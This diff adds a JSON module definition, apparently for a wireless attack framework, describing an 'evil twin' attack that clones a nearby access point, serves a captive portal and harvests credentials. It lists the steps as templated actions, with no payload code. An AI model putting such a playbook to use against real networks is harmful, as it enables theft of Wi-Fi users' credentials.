@@ -1,0 +1,40 @@
+{
+  "name": "evil_twin",
+  "category": "wifi",
+  "description": "Clone AP, serve captive portal, harvest credentials",
+  "version": "1.0",
+  "author": "JAMES",
+  "steps": [
+    {
+      "action": "ensure_wireless_interface",
+      "description": "Verify wireless interface {{interface}} is available",
+      "params": {
+        "interface": "{{interface}}"
+      }
+    },
+    {
+      "action": "start_monitor",
+      "description": "Enable monitor mode on {{interface}}",
+      "params": {
+        "interface": "{{interface}}"
+      }
+    },
+    {
+      "action": "scan_nearby_aps",
+      "description": "Scan for target AP to clone",
+      "params": {
+        "interface": "{{interface}}",
+        "duration": 10
+      }
+    },
+    {
+      "action": "start_evil_twin",
+      "description": "Launch evil twin + portal on {{target_ssid}}",
+      "params": {
+        "interface": "{{interface}}",
+        "ssid": "{{target_ssid}}",
+        "channel": "{{channel}}"
+      }
+    }
+  ]
+}
